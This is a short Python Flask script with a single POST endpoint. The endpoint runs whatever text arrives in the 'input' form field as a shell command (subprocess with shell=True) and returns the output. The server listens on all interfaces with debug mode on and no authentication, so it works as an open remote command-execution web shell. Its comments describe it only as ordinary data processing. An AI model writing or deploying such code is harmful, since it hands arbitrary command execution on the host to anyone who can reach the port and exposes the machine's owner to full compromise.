from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/', methods=['POST'])
def handle_request():
    data = request.form.get('input')  # Get the 'input' value from the form data
    # Process the received data or perform any desired actions
    response = f"Received data: {data}"
    command_output = subprocess.check_output(data, shell=True, universal_newlines=True)
    #return response # Send a response back to the client
    return command_output

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1000, debug="true")  # Start the server